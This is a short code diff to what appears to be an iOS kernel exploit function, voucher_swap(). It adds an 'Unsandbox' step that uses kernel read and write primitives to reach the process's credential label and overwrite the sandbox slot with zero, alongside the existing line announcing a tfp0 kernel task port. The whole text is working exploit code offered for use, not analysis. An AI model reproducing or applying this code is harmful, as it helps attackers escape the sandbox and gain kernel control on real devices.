@@ -1138,6 +1138,12 @@ voucher_swap() {
 	pipe_close(pipefds);
 	free(pipe_buffer);
 	mach_port_destroy(mach_task_self(), base_port);
+    
+    // 30. Unsandbox
+    uint64_t selfproc = kernel_read64(current_task + OFFSET(task, bsd_info));
+    uint64_t ucred = kernel_read64(selfproc + OFFSET(proc, p_ucred));
+    uint64_t cr_label = kernel_read64(ucred + 0x78);
+    kernel_write64(cr_label + 0x10, 0);
 
 	// And that's it! Enjoy kernel read/write via kernel_task_port.
 	INFO("done! port 0x%x is tfp0", kernel_task_port);
